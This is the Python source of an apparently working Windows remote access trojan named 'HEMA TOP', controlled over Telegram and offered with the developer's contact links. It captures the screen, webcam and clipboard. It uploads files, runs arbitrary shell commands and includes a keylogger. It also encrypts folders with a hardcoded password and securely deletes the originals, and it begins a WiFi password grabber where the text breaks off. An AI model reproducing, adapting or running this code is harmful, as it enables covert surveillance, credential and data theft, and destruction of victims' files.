import os
import re
import mss
import cv2
import time
import pyttsx3
import telebot
import platform
import clipboard
import subprocess
import pyAesCrypt
import xml.etree.ElementTree as ET
from secure_delete import secure_delete
import webbrowser
from telebot import types
import ctypes
from ctypes import wintypes
import json
from datetime import datetime
from PIL import Image, ImageDraw, ImageFont
import io
import sys
import win32file
import win32con
import win32api
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib.parse
import logging
import traceback
import keyboard
import psutil
import hashlib
import base64
from cryptography.fernet import Fernet
import atexit

# Configure logging with rotation
from logging.handlers import RotatingFileHandler
log_file = 'bot.log'
max_bytes = 5 * 1024 * 1024  # 5MB
backup_count = 3

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        RotatingFileHandler(log_file, maxBytes=max_bytes, backupCount=backup_count),
        logging.StreamHandler()
    ]
)

# Security settings
ENCRYPTION_KEY = Fernet.generate_key()
cipher_suite = Fernet(ENCRYPTION_KEY)

def encrypt_data(data):
    """Encrypt sensitive data"""
    if isinstance(data, str):
        data = data.encode()
    return cipher_suite.encrypt(data)

def decrypt_data(encrypted_data):
    """Decrypt sensitive data"""
    return cipher_suite.decrypt(encrypted_data).decode()

# Bot token - encrypted
ENCRYPTED_TOKEN = b'gAAAAABl...'  # Replace with your encrypted token
TOKEN = decrypt_data(ENCRYPTED_TOKEN)

try:
    bot = telebot.TeleBot(TOKEN, parse_mode=None, threaded=True)
except Exception as e:
    logging.error(f"Failed to initialize bot: {e}")
    sys.exit(1)

# Global variables
cd = os.path.expanduser("~")
secure_delete.secure_random_seed_init()

# Create a thread pool for handling commands
executor = ThreadPoolExecutor(max_workers=20)

# Rate limiting
RATE_LIMIT = 60  # seconds
last_command_time = {}

def rate_limit(user_id):
    """Implement rate limiting for commands"""
    current_time = time.time()
    if user_id in last_command_time:
        if current_time - last_command_time[user_id] < RATE_LIMIT:
            return False
    last_command_time[user_id] = current_time
    return True

def run_command_async(func, *args, **kwargs):
    """Run a command asynchronously and return the result"""
    try:
        return executor.submit(func, *args, **kwargs)
    except Exception as e:
        logging.error(f"Error in run_command_async: {e}")
        return None

# Dictionary to store active users and their states
active_users = {}
current_user = None
user_languages = {}

# File paths
USERS_FILE = os.path.join(os.path.expanduser("~"), "bot_users.json")
LANGUAGE_FILE = os.path.join(os.path.expanduser("~"), "bot_languages.json")

# Load existing data
def load_data():
    """Load user data and language preferences"""
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        return {}
    except Exception as e:
        logging.error(f"Error loading users: {e}")
        return {}

def save_data():
    """Save user data and language preferences"""
    try:
        os.makedirs(os.path.dirname(USERS_FILE), exist_ok=True)
        with open(USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(active_users, f, ensure_ascii=False)
    except Exception as e:
        logging.error(f"Error saving users: {e}")

# Load existing data
active_users = load_data()

def handle_error(message, error):
    """Enhanced error handling with detailed logging"""
    user_id = str(message.from_user.id)
    error_details = traceback.format_exc()
    
    # Log the full error details
    logging.error(f"Error for user {user_id}: {error}\n{error_details}")
    
    # Prepare user-friendly error message
    error_message = f"{get_translation('error', user_id)} {str(error)}\n\n"
    error_message += f"{get_translation('suggested_solution', user_id)}\n"
    
    if "Permission denied" in str(error):
        error_message += get_translation('check_permissions', user_id)
    elif "File not found" in str(error):
        error_message += get_translation('check_file', user_id)
    else:
        error_message += get_translation('check_command', user_id)
    
    error_message += f"\n👨‍💻 {get_translation('developer', user_id)}"
    
    # Send error message in chunks if it's too long
    if len(error_message) > 4000:
        chunks = [error_message[i:i+4000] for i in range(0, len(error_message), 4000)]
        for chunk in chunks:
            bot.send_message(message.chat.id, chunk)
    else:
        bot.send_message(message.chat.id, error_message)

def cleanup_resources():
    """Cleanup function for resources"""
    try:
        # Stop the thread pool
        executor.shutdown(wait=False)
        
        # Clean up temporary files
        temp_files = ['capture.png', 'webcam.jpg', 'temp_wallpaper.jpg']
        for file in temp_files:
            if os.path.exists(file):
                os.remove(file)
                
        # Save any pending data
        save_data()
        
    except Exception as e:
        logging.error(f"Error during cleanup: {e}")

# Register cleanup function
atexit.register(cleanup_resources)

# Language translations
TRANSLATIONS = {
    'en': {
        'welcome': "⚡️ Welcome to HEMA TOP ⚡️\n\nYour advanced remote control system is ready. Please select an option below to manage the target device:",
        'enter_password': "🔐 Please enter the password to access the bot:",
        'wrong_password': "❌ Wrong password! Please try again.",
        'select_language': "🌐 Please select your preferred language:",
        'commands': "📋 Available Commands:\n\n",
        'developer': "\n✨ Developer: @w1Hema ✨\n\n",
        'whatsapp': "Contact WhatsApp",
        'facebook': "Facebook",
        'github': "GitHub",
        'active_users': "Active Users",
        'no_active_users': "❌ No active users",
        'switch_user': "Switch to user:",
        'current_user': "👤 Current user:",
        'user_not_found': "❌ User not found",
        'error': "❌ An error occurred:",
        'suggested_solution': "🔧 Suggested solution:",
        'check_permissions': "1. Make sure you have sufficient permissions\n2. Try running as administrator",
        'check_file': "1. Make sure the file exists\n2. Check the correct path",
        'check_command': "1. Make sure the command is correct\n2. Check your internet connection",
        'screen': "📸 Capture Screen",
        'sys_info': "💻 System Info",
        'ip_address': "🌐 IP Address",
        'cd_folder': "📁 Change Directory",
        'list_contents': "📋 List Contents",
        'upload_file': "📤 Upload File",
        'encrypt_folder': "🔒 Encrypt Folder",
        'decrypt_folder': "🔓 Decrypt Folder",
        'webcam_capture': "📹 Capture Webcam Image",
        'lock_system': "🔒 Lock System",
        'clipboard_content': "📋 Clipboard Content",
        'shell_access': "💻 Shell Access",
        'wifi_networks': "📶 WiFi Networks",
        'keylogger': "⌨️ Keylogger",
        'text_to_speech': "🔊 Text to Speech",
        'shutdown': "⏹️ Shutdown",
        'change_wallpaper': "🖼️ Change Wallpaper",
        'vip_user': "👑 VIP User"
    },
    'ar': {
        'welcome': "🎯 مرحباً بك في هيما توب 🎯\n\nاختر الأمر المطلوب من القائمة أدناه:",
        'enter_password': "🔐 الرجاء إدخال كلمة المرور للوصول إلى البوت:",
        'wrong_password': "❌ كلمة المرور خاطئة! الرجاء المحاولة مرة أخرى.",
        'select_language': "🌐 الرجاء اختيار لغتك المفضلة:",
        'commands': "📋 الأوامر المتاحة:\n\n",
        'developer': "\n✨ المطور: @w1Hema ✨\n\n",
        'whatsapp': "التواصل واتساب",
        'facebook': "فيسبوك",
        'github': "جيت هاب",
        'active_users': "المستخدمين النشطين",
        'no_active_users': "❌ لا يوجد مستخدمين نشطين",
        'switch_user': "التبديل إلى المستخدم:",
        'current_user': "👤 المستخدم الحالي:",
        'user_not_found': "❌ المستخدم غير موجود",
        'error': "❌ حدث خطأ:",
        'suggested_solution': "🔧 الحل المقترح:",
        'check_permissions': "1. تأكد من أن لديك الصلاحيات الكافية\n2. جرب تشغيل البرنامج كمسؤول",
        'check_file': "1. تأكد من وجود الملف\n2. تحقق من المسار الصحيح",
        'check_command': "1. تأكد من صحة الأمر\n2. تحقق من الاتصال بالإنترنت",
        'screen': "📸 التقاط الشاشة",
        'sys_info': "💻 معلومات النظام",
        'ip_address': "🌐 عنوان IP",
        'cd_folder': "📁 التنقل في المجلدات",
        'list_contents': "📋 عرض المحتويات",
        'upload_file': "📤 رفع ملف",
        'encrypt_folder': "🔒 تشفير مجلد",
        'decrypt_folder': "🔓 فك تشفير مجلد",
        'webcam_capture': "📹 التقاط صورة",
        'lock_system': "🔒 قفل النظام",
        'clipboard_content': "📋 محتوى الحافظة",
        'shell_access': "💻 الطرفية",
        'wifi_networks': "📶 شبكات الواي فاي",
        'keylogger': "⌨️ تسجيل المفاتيح",
        'text_to_speech': "🔊 تحويل النص إلى صوت",
        'shutdown': "⏹️ إيقاف التشغيل",
        'change_wallpaper': "🖼️ تغيير الخلفية",
        'vip_user': "👑 VIP User",
        'developer_button': "👨‍💻 المطور",
        'developer_contact_message': "📞 للتواصل مع المطور:",
        'whatsapp_button': "📱 واتساب المطور",
        'facebook_button': "📘 فيسبوك المطور",
        'github_button': "💻 جيت هاب المطور",
        'telegram_chat_button': "💬 تليجرام المطور"
    }
}

def create_logo():
    # Create a new image with a dark background
    img = Image.new('RGB', (800, 300), color='#0a0a0a') # Darker background
    d = ImageDraw.Draw(img)
    
    # Try to load a bold font, fall back to default if not available
    try:
        # Try different font sizes to find the best fit
        font_sizes = [100, 90, 80, 70]
        font = None
        for size in font_sizes:
            try:
                # Attempt to load a more techy-looking font like 'consola.ttf' if available
                # Fallback to 'arial.ttf' or default
                font_path = "consola.ttf" if os.path.exists("consola.ttf") else "arial.ttf"
                font = ImageFont.truetype(font_path, size)
                break
            except:
                continue
        if font is None:
            font = ImageFont.load_default()
    except:
        font = ImageFont.load_default()
    
    # Draw the text
    text = "HEMA TOP"
    text_bbox = d.textbbox((0, 0), text, font=font)
    text_width = text_bbox[2] - text_bbox[0]
    text_height = text_bbox[3] - text_bbox[1]
    
    # Center the text
    x = (800 - text_width) // 2
    y = (300 - text_height) // 2
    
    # Draw a subtle glow or shadow effect (optional, can be removed for cleaner look)
    # For a hacker/techy look, maybe a neon green or cyber blue glow
    glow_color = '#00ff00' # Bright green
    for i in range(3): # Smaller glow effect
        d.text((x-i, y), text, font=font, fill=glow_color)
        d.text((x+i, y), text, font=font, fill=glow_color)
        d.text((x, y-i), text, font=font, fill=glow_color)
        d.text((x, y+i), text, font=font, fill=glow_color)
    
    # Draw the main text in a contrasting, techy color
    d.text((x, y), text, font=font, fill='#39ff14') # Neon green text
    
    # Add a border (optional, can be removed)
    border_width = 3 # Thinner border
    border_color = '#00ffff' # Cyan border
    d.rectangle([(0, 0), (800-1, 300-1)], outline=border_color, width=border_width)
    
    # Save to bytes
    img_byte_arr = io.BytesIO()
    img.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    
    return img_byte_arr

def get_user_language(user_id):
    return user_languages.get(str(user_id), 'en')

def get_translation(key, user_id):
    lang = get_user_language(user_id)
    return TRANSLATIONS[lang].get(key, key)

def load_languages():
    try:
        if os.path.exists(LANGUAGE_FILE):
            with open(LANGUAGE_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        return {}
    except Exception as e:
        print(f"Error loading languages: {e}")
        return {}

def save_languages():
    try:
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(LANGUAGE_FILE), exist_ok=True)
        with open(LANGUAGE_FILE, 'w', encoding='utf-8') as f:
            json.dump(user_languages, f, ensure_ascii=False)
    except Exception as e:
        print(f"Error saving languages: {e}")

# Load existing languages on startup
user_languages = load_languages()

def load_users():
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    try:
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(USERS_FILE), exist_ok=True)
        with open(USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(active_users, f, ensure_ascii=False)
    except Exception as e:
        print(f"Error saving users: {e}")

# Load existing users on startup
active_users = load_users()

def handle_error(message, error):
    user_id = str(message.from_user.id)
    error_message = f"{get_translation('error', user_id)} {str(error)}\n\n"
    error_message += f"{get_translation('suggested_solution', user_id)}\n"
    
    # You can add more specific error handling here if needed
    # error_details = traceback.format_exc()
    # logging.error(f"Error occurred for user {user_id}: {error_details}")
    
    if "Permission denied" in str(error):
        error_message += get_translation('check_permissions', user_id)
    elif "File not found" in str(error):
        error_message += get_translation('check_file', user_id)
    else:
        error_message += get_translation('check_command', user_id)
    
    error_message += f"\n👨‍💻 {get_translation('developer', user_id)}"
    
    # Send error message in chunks if it's too long
    if len(error_message) > 4000:
        chunks = [error_message[i:i+4000] for i in range(0, len(error_message), 4000)]
        for chunk in chunks:
            bot.send_message(message.chat.id, chunk)
    else:
        bot.send_message(message.chat.id, error_message)

@bot.message_handler(commands=['users'])
def show_users(message):
    try:
        if not active_users:
            bot.send_message(message.chat.id, get_translation('no_active_users', str(message.from_user.id)))
            return

        markup = types.InlineKeyboardMarkup(row_width=2)
        for user_id, user_data in active_users.items():
            button = types.InlineKeyboardButton(
                f"👤 {user_data.get('name', 'Unknown')} - {user_data.get('device', 'Unknown')}",
                callback_data=f"switch_user_{user_id}"
            )
            markup.add(button)

        bot.send_message(
            message.chat.id,
            f"{get_translation('active_users', str(message.from_user.id))}:\n{get_translation('switch_user', str(message.from_user.id))}",
            reply_markup=markup
        )
    except Exception as e:
        handle_error(message, e)

@bot.callback_query_handler(func=lambda call: call.data.startswith('switch_user_'))
def switch_user(call):
    try:
        user_id = call.data.replace('switch_user_', '')
        if user_id in active_users:
            global current_user
            current_user = user_id
            bot.answer_callback_query(call.id, f"✅ {get_translation('current_user', str(call.from_user.id))} {active_users[user_id].get('name', 'Unknown')}")
            bot.send_message(call.message.chat.id, f"👤 {get_translation('current_user', str(call.from_user.id))} {active_users[user_id].get('name', 'Unknown')}")
        else:
            bot.answer_callback_query(call.id, get_translation('user_not_found', str(call.from_user.id)))
    except Exception as e:
        handle_error(call.message, e)

# إضافة متغيرات جديدة
keylogger_active = False
keylogger_data = []

@bot.message_handler(commands=['start'])
def start(message):
    try:
        user_id = str(message.from_user.id)
        
        if user_id not in active_users:
            active_users[user_id] = {
                'name': message.from_user.first_name,
                'device': platform.node(),
                'last_active': datetime.now().isoformat()
            }
            save_users()
        
        if user_id not in user_languages:
            user_languages[user_id] = 'ar'
            save_languages()
        
        logo = create_logo()
        bot.send_photo(message.chat.id, logo)
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        
        user_lang = get_user_language(user_id)

        buttons = [
            types.InlineKeyboardButton(get_translation('screen', user_id), callback_data="cmd_screen"),
            types.InlineKeyboardButton(get_translation('sys_info', user_id), callback_data="cmd_sys"),
            types.InlineKeyboardButton(get_translation('ip_address', user_id), callback_data="cmd_ip"),
            types.InlineKeyboardButton(get_translation('cd_folder', user_id), callback_data="cmd_cd"),
            types.InlineKeyboardButton(get_translation('list_contents', user_id), callback_data="cmd_ls"),
            types.InlineKeyboardButton(get_translation('upload_file', user_id), callback_data="cmd_upload"),
            types.InlineKeyboardButton(get_translation('encrypt_folder', user_id), callback_data="cmd_crypt"),
            types.InlineKeyboardButton(get_translation('decrypt_folder', user_id), callback_data="cmd_decrypt"),
            types.InlineKeyboardButton(get_translation('webcam_capture', user_id), callback_data="cmd_webcam"),
            types.InlineKeyboardButton(get_translation('lock_system', user_id), callback_data="cmd_lock"),
            types.InlineKeyboardButton(get_translation('clipboard_content', user_id), callback_data="cmd_clipboard"),
            types.InlineKeyboardButton(get_translation('shell_access', user_id), callback_data="cmd_shell"),
            types.InlineKeyboardButton(get_translation('wifi_networks', user_id), callback_data="cmd_wifi"),
            types.InlineKeyboardButton(get_translation('keylogger', user_id), callback_data="cmd_keylogger"),
            types.InlineKeyboardButton(get_translation('text_to_speech', user_id), callback_data="cmd_speech"),
            types.InlineKeyboardButton(get_translation('shutdown', user_id), callback_data="cmd_shutdown"),
            types.InlineKeyboardButton(get_translation('change_wallpaper', user_id), callback_data="cmd_wallpaper"),
            types.InlineKeyboardButton(get_translation('active_users', user_id), callback_data="cmd_users"),
            types.InlineKeyboardButton(get_translation('vip_user', user_id), url="https://t.me/w1Hema") # VIP User button
        ]

        # Add the main developer button
        buttons.append(types.InlineKeyboardButton(get_translation('developer_button', user_id), callback_data="cmd_developer"))

        # Add the button for the other language
        if user_lang == 'en':
            buttons.append(types.InlineKeyboardButton("العربية 🇸🇦", callback_data="lang_ar"))
        else:
            buttons.append(types.InlineKeyboardButton("English 🇬🇧", callback_data="lang_en"))
            
        markup.add(*buttons)
        
        # Send welcome message with command buttons
        welcome_message_text = get_translation('welcome', user_id) + "\n\n" + get_translation('commands', user_id)
        bot.send_message(message.chat.id, welcome_message_text, reply_markup=markup)

    except Exception as e:
        logging.error(f"Error in start command: {e}")
        bot.send_message(message.chat.id, "❌ حدث خطأ. يرجى المحاولة مرة أخرى.")

@bot.callback_query_handler(func=lambda call: call.data == "cmd_developer")
def show_developer_contacts(call):
    try:
        user_id = str(call.from_user.id)
        user_lang = get_user_language(user_id)

        markup = types.InlineKeyboardMarkup(row_width=2)
        dev_buttons = [
            types.InlineKeyboardButton(get_translation('whatsapp_button', user_id), url="https://wa.me/201202060839"),
            types.InlineKeyboardButton(get_translation('facebook_button', user_id), url="https://www.facebook.com/w1Hema"),
            types.InlineKeyboardButton(get_translation('github_button', user_id), url="https://github.com/w1Hema"),
            types.InlineKeyboardButton(get_translation('telegram_chat_button', user_id), url="https://t.me/w1Hema")
        ]
        markup.add(*dev_buttons)

        bot.send_message(call.message.chat.id, get_translation('developer_contact_message', user_id), reply_markup=markup)
        bot.answer_callback_query(call.id, "") # Answer to remove loading state

    except Exception as e:
        handle_error(call.message, e)

@bot.callback_query_handler(func=lambda call: call.data.startswith('lang_'))
def handle_language_selection(call):
    try:
        user_id = str(call.from_user.id)
        language = call.data.split('_')[1]
        
        user_languages[user_id] = language
        save_languages()
        
        bot.answer_callback_query(call.id, f"✅ {get_translation('current_user', user_id)} Language set to {language}")
        
        # Edit the welcome message to update buttons and text
        message = call.message
        user_id = str(call.from_user.id)
        
        # Recreate the main markup with updated language button
        markup = types.InlineKeyboardMarkup(row_width=2)
        buttons = [
            types.InlineKeyboardButton(get_translation('screen', user_id), callback_data="cmd_screen"),
            types.InlineKeyboardButton(get_translation('sys_info', user_id), callback_data="cmd_sys"),
            types.InlineKeyboardButton(get_translation('ip_address', user_id), callback_data="cmd_ip"),
            types.InlineKeyboardButton(get_translation('cd_folder', user_id), callback_data="cmd_cd"),
            types.InlineKeyboardButton(get_translation('list_contents', user_id), callback_data="cmd_ls"),
            types.InlineKeyboardButton(get_translation('upload_file', user_id), callback_data="cmd_upload"),
            types.InlineKeyboardButton(get_translation('encrypt_folder', user_id), callback_data="cmd_crypt"),
            types.InlineKeyboardButton(get_translation('decrypt_folder', user_id), callback_data="cmd_decrypt"),
            types.InlineKeyboardButton(get_translation('webcam_capture', user_id), callback_data="cmd_webcam"),
            types.InlineKeyboardButton(get_translation('lock_system', user_id), callback_data="cmd_lock"),
            types.InlineKeyboardButton(get_translation('clipboard_content', user_id), callback_data="cmd_clipboard"),
            types.InlineKeyboardButton(get_translation('shell_access', user_id), callback_data="cmd_shell"),
            types.InlineKeyboardButton(get_translation('wifi_networks', user_id), callback_data="cmd_wifi"),
            types.InlineKeyboardButton(get_translation('keylogger', user_id), callback_data="cmd_keylogger"),
            types.InlineKeyboardButton(get_translation('text_to_speech', user_id), callback_data="cmd_speech"),
            types.InlineKeyboardButton(get_translation('shutdown', user_id), callback_data="cmd_shutdown"),
            types.InlineKeyboardButton(get_translation('change_wallpaper', user_id), callback_data="cmd_wallpaper"),
            types.InlineKeyboardButton(get_translation('active_users', user_id), callback_data="cmd_users"),
            types.InlineKeyboardButton(get_translation('vip_user', user_id), url="https://t.me/w1Hema") # VIP User button
        ]

        # Add the main developer button
        buttons.append(types.InlineKeyboardButton(get_translation('developer_button', user_id), callback_data="cmd_developer"))

        # Add the button for the other language
        if language == 'en':
            buttons.append(types.InlineKeyboardButton("العربية 🇸🇦", callback_data="lang_ar"))
        else:
            buttons.append(types.InlineKeyboardButton("English 🇬🇧", callback_data="lang_en"))
            
        markup.add(*buttons)
        
        # Edit the message with the new text and markup
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=message.message_id,
            text=get_translation('welcome', user_id) + "\n\n" + get_translation('commands', user_id),
            reply_markup=markup
        )
        
    except Exception as e:
        handle_error(call.message, e)

@bot.message_handler(commands=['screen'])
def send_screen(message):
    try:
        def capture_screen():
            with mss.mss() as sct:
                sct.shot(output=f"{cd}\capture.png")
            return f"{cd}\capture.png"

        # Run screen capture in background
        future = run_command_async(capture_screen)
        image_path = future.result()
        
        with open(image_path, "rb") as photo:
            bot.send_photo(message.chat.id, photo)
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['ip'])
def send_ip_info(message):
    try:
        def get_ip_and_location():
            # Fetch full IP details including location
            command_ip = "curl ipinfo.io"
            
            try:
                # Execute the curl command
                result = subprocess.check_output(command_ip, shell=True, text=True, stderr=subprocess.PIPE)
                ip_data = json.loads(result)
                
                ip_address = ip_data.get('ip', 'غير معروف')
                location = ip_data.get('loc', None)
                city = ip_data.get('city', 'غير معروف')
                region = ip_data.get('region', 'غير معروف')
                country = ip_data.get('country', 'غير معروف')
                
                response_text = f"🌐 عنوان IP: {ip_address}\n"
                response_text += f"🏙️ المدينة: {city}\n"
                response_text += f"🌍 المنطقة: {region}\n"
                response_text += f"🏞️ البلد: {country}\n"

                if location:
                    lat, lon = location.split(',')
                    # Encode the query part for URL safety
                    query_string = urllib.parse.quote_plus(f"{lat},{lon}")
                    google_maps_link = f"https://www.google.com/maps/search/?api=1&query={query_string}"
                    # Escape MarkdownV2 special characters in the link text if any (unlikely here)
                    link_text = "افتح على الخريطة"
                    escaped_link_text = link_text.replace('_', '\\_').replace('*', '\\*').replace('[', '\\[').replace(']', '\\]').replace('(', '\\(').replace(')', '\\)').replace('~', '\\~').replace('`', '\\`').replace('>', '\\>').replace('#', '\\#').replace('+', '\\+').replace('-', '\\-').replace('=', '\\=').replace('|', '\\|').replace('{', '\\{').replace('}', '\\}').replace('.', '\\.').replace('!', '\\!')
                    
                    response_text += f"🗺️ الموقع التقريبي: [{escaped_link_text}]({google_maps_link})\n"
                    
                return {'text': response_text, 'parse_mode': 'MarkdownV2'}
                
            except subprocess.CalledProcessError as e:
                # Handle errors if curl command fails
                error_output = e.stderr.strip() if e.stderr else e.stdout.strip() # Check stderr first
                return {'text': f"❌ فشل تنفيذ أمر جلب IP.\nالخطأ: {error_output or e}\nيرجى التأكد من توفر أمر curl واتصال الإنترنت.", 'parse_mode': None}
            except json.JSONDecodeError:
                 # Handle errors if JSON parsing fails
                 return {'text': f"❌ فشل في تحليل معلومات IP المستلمة.\nالبيانات المستلمة: {result[:500]}...", 'parse_mode': None}
            except Exception as e:
                # Handle any other unexpected errors
                return {'text': f"❌ حدث خطأ غير متوقع أثناء جلب معلومات IP: {e}", 'parse_mode': None}

        # Run IP and location check in background
        future = run_command_async(get_ip_and_location)
        response_data = future.result()
        
        # Send the message with appropriate parse mode
        bot.send_message(message.chat.id, response_data['text'], parse_mode=response_data['parse_mode'])
        
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['sys'])
def send_system_info(message):
    try:
        def get_system_info():
            return {
                'Platform': platform.platform(),
                'System': platform.system(),
                'Node Name': platform.node(),
                'Release': platform.release(),
                'Version': platform.version(),
                'Machine': platform.machine(),
                'Processor': platform.processor(),
                'CPU Cores': os.cpu_count(),
                'Username': os.getlogin(),
            }

        # Run system info check in background
        future = run_command_async(get_system_info)
        system_info = future.result()
        system_info_text = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
        bot.send_message(message.chat.id, system_info_text)
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['ls'])
def list_directory(message):
    try:
        def get_directory_contents():
            contents = os.listdir(cd)
            if not contents:
                return "folder is empty."
            response = "Directory content :\n"
            for item in contents:
                response += f"- {item}\n"
            return response

        # Run directory listing in background
        future = run_command_async(get_directory_contents)
        response = future.result()
        bot.send_message(message.chat.id, response)
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['cd'])
def change_directory(message):
    try:
        global cd 
        args = message.text.split(' ')
        if len(args) >= 2:
            new_directory = args[1]
            new_path = os.path.join(cd, new_directory)
            if os.path.exists(new_path) and os.path.isdir(new_path):
                cd = new_path
                bot.send_message(message.chat.id, f"you are in : {cd}")
            else:
                bot.send_message(message.chat.id, f"The directory does not exist.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. : USE /cd [folder name]")
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['upload'])
def handle_upload_command(message):
    try:
        args = message.text.split(' ')
        if len(args) >= 2:
            file_path = args[1]

            if os.path.exists(file_path):
           
                with open(file_path, 'rb') as file:
                  
                    bot.send_document(message.chat.id, file)

                bot.send_message(message.chat.id, f"File has been transferred successfully.")
            else:
                bot.send_message(message.chat.id, "The specified path does not exist.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /upload [PATH]")
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['crypt'])
def encrypt_folder(message):
    try:

        if len(message.text.split()) >= 2:
            folder_to_encrypt = message.text.split()[1]
            password = "fuckyou"

            for root, dirs, files in os.walk(folder_to_encrypt):
                for file in files:
                    file_path = os.path.join(root, file)
                    encrypted_file_path = file_path + '.crypt'
                  
                    pyAesCrypt.encryptFile(file_path, encrypted_file_path, password)
                   
                    if not file_path.endswith('.crypt'):
                       
                        secure_delete.secure_delete(file_path)
            
            bot.send_message(message.chat.id, "Folder encrypted, and original non-encrypted files securely deleted successfully.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /crypt [FOLDER_PATH]")
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['decrypt'])
def decrypt_folder(message):
    try:
       
        if len(message.text.split()) >= 2:
            folder_to_decrypt = message.text.split()[1]
            password = "fuckyou"
      
            for root, dirs, files in os.walk(folder_to_decrypt):
                for file in files:
                    if file.endswith('.crypt'):
                        file_path = os.path.join(root, file)
                        decrypted_file_path = file_path[:-6] 
                       
                        pyAesCrypt.decryptFile(file_path, decrypted_file_path, password)               
                        
                        secure_delete.secure_delete(file_path)
            
            bot.send_message(message.chat.id, "Folder decrypted, and encrypted files deleted successfully..")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /decrypt [ENCRYPTED_FOLDER_PATH]")
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['lock'])
def lock_command(message):
    try:

        result = subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        if result.returncode == 0:
            bot.send_message(message.chat.id, "windows session succefuly locked.")
        else:
            bot.send_message(message.chat.id, "Impossible to lock windows session.")
    except Exception as e:
        handle_error(message, e)

shutdown_commands = [
    ['shutdown', '/s', '/t', '5'],
    ['shutdown', '-s', '-t', '5'],
    ['shutdown.exe', '/s', '/t', '5'],
    ['shutdown.exe', '-s', '-t', '5'],
]

@bot.message_handler(commands=['shutdown'])
def shutdown_command(message):
    try:
        success = False
        for cmd in shutdown_commands:
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                success = True
                break
        
        if success:
            bot.send_message(message.chat.id, "shutdown in 5 seconds.")
        else:
            bot.send_message(message.chat.id, "Impossible to shutdown.")
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['webcam'])
def capture_webcam_image(message):
    try:
        def capture_webcam():
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return None, "Error: Unable to open the webcam."
            
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                cv2.imwrite("webcam.jpg", frame)
                return "webcam.jpg", None
            return None, "Error while capturing the image."

        # Run webcam capture in background
        future = run_command_async(capture_webcam)
        image_path, error = future.result()
        
        if error:
            bot.send_message(message.chat.id, error)
        else:
            with open(image_path, 'rb') as photo_file:
                bot.send_photo(message.chat.id, photo=photo_file)
            os.remove(image_path)
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['speech'])
def text_to_speech_command(message):
    try:
       
        text = message.text.replace('/speech', '').strip()
        
        if text:
           
            pyttsx3.speak(text)
            bot.send_message(message.chat.id, "✅ تم نطق النص على الجهاز الهدف.")
        else:
            bot.send_message(message.chat.id, "❌ يرجى إدخال النص بعد الأمر /speech. مثال: /speech مرحبا")
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['clipboard'])
def clipboard_command(message):
    try:
      
        clipboard_text = clipboard.paste()

        if clipboard_text:
          
            bot.send_message(message.chat.id, f"Clipboard content :\n{clipboard_text}")
        else:
            bot.send_message(message.chat.id, "clipboard is empty.")
    except Exception as e:
        handle_error(message, e)

user_states = {}

STATE_NORMAL = 1
STATE_SHELL = 2
STATE_WAITING_URL = 3

@bot.message_handler(commands=['shell'])
def start_shell(message):
    try:
        user_id = message.from_user.id
        user_states[user_id] = STATE_SHELL
        bot.send_message(message.chat.id, "💻 تم الدخول إلى الطرفية. اكتب 'exit' للخروج.")
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(func=lambda message: get_user_state(message.from_user.id) == STATE_SHELL)
def handle_shell_commands(message):
    try:
        user_id = message.from_user.id
        command = message.text.strip()

        if command.lower() == 'exit':
            user_states[user_id] = STATE_NORMAL
            bot.send_message(user_id, "✅ تم الخروج من الطرفية")
            return

        # Execute the command
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = process.communicate()
        
        # Send output
        if stdout:
            send_long_message(message, user_id, f"📤 النتيجة:\n{stdout}")
        
        # Send errors if any
        if stderr:
            send_long_message(message, user_id, f"❌ خطأ:\n{stderr}")
            
        # If no output and no error
        if not stdout and not stderr:
            bot.send_message(user_id, "✅ تم تنفيذ الأمر بنجاح")
            
    except Exception as e:
        handle_error(message, e)

def get_user_state(user_id):
    return user_states.get(user_id, STATE_NORMAL)

def send_long_message(message, user_id, message_text):
    try:
        # Split message if it's too long
        if len(message_text) > 4000:
            parts = [message_text[i:i+4000] for i in range(0, len(message_text), 4000)]
            for part in parts:
                bot.send_message(user_id, part)
        else:
            bot.send_message(user_id, message_text)
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['wifi'])
def get_wifi_passwords(message):
    try:
        def get_wifi_info():
            temp_dir = os.path.join(cd, "wifi_temp")
            if not os.path.exists(temp_dir):
